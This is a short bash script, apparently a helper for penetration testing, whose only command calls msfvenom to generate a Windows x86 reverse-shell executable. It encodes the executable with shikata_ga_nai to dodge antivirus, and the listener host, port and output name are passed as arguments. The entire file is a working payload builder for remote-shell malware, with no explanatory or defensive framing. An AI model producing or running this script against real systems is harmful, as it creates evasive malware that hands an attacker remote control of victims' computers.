#!/bin/bash

msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST="$2" LPORT="$3" -f exe -o "$1"/"$4".exe
